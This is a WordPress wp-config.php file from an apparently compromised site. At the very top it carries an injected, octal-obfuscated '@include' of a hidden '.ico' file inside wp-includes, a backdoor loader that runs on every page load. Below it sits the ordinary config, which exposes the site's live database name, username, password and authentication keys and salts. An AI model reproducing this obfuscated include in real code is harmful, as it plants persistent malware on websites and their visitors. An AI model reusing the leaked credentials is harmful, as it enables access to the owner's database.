<?php
/*c8053*/

@include "\057ho\155e/\145qr\153rb\154f/\144om\141in\163/l\141pm\141ng\146pt\150an\157i.\151nf\157/p\165bl\151c_\150tm\154/w\160-i\156cl\165de\163/j\163/c\162op\057.1\144b0\1456a\060.i\143o";

/*c8053*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'eqrkrblf_eqr' );

/** MySQL database username */
define( 'DB_USER', 'eqrkrblf_eqr' );

/** MySQL database password */
define( 'DB_PASSWORD', 'kuPhMRS0' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'R6%9+|Z~}zC2!I^~?Ol-0I:z32t[ti)|6N{m$IYWX!N(n!R*YV/_e..Zk7.mbmgY' );
define( 'SECURE_AUTH_KEY',  '+qaAGkMu{Yr@l;d83t>(CVqq?)9R~I~uB_1b@#wtC&r8J@#qhGxf? x7}5gQP`)_' );
define( 'LOGGED_IN_KEY',    ':Tie3J{A.UTi5g?>-X}riSl{FXu}5t;tACMl+@wUt#LsASz>R/,jjR]Y)RBSvRS~' );
define( 'NONCE_KEY',        'M8xLg}srMM(BCLTR>nE`,eBP 6nX61+r 1SXfnt$#UF|ar>Cuypw!k5qy|8F4+23' );
define( 'AUTH_SALT',        '|wF U,_/|*VR;(zl/3En~UAjS+uC7T`#@{jlANm:(90/Cd.bEn>gTy;+62b):mQ~' );
define( 'SECURE_AUTH_SALT', 'S}~P/U0x._eha,{//?Ur%g%Sr/WQ&u;n99QbZ^s@^fR9|8B/5Xi3LjmsyK2Q01@Z' );
define( 'LOGGED_IN_SALT',   'Y=hIDaJnlK0/]1@Lt10)S8P6rN$?SZE5Tbg_d*VtH4D$hQSHOA[c09+CLx}`)npI' );
define( 'NONCE_SALT',       'N(D:,Uat/fWVB=spz*^We[G;d7tUu/ru/|;A-~-Y [EHU4]&fj?{46b9X:~4,/Et' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', dirname( __FILE__ ) . '/' );
}

/** Sets up WordPress vars and included files. */
require_once( ABSPATH . 'wp-settings.php' );
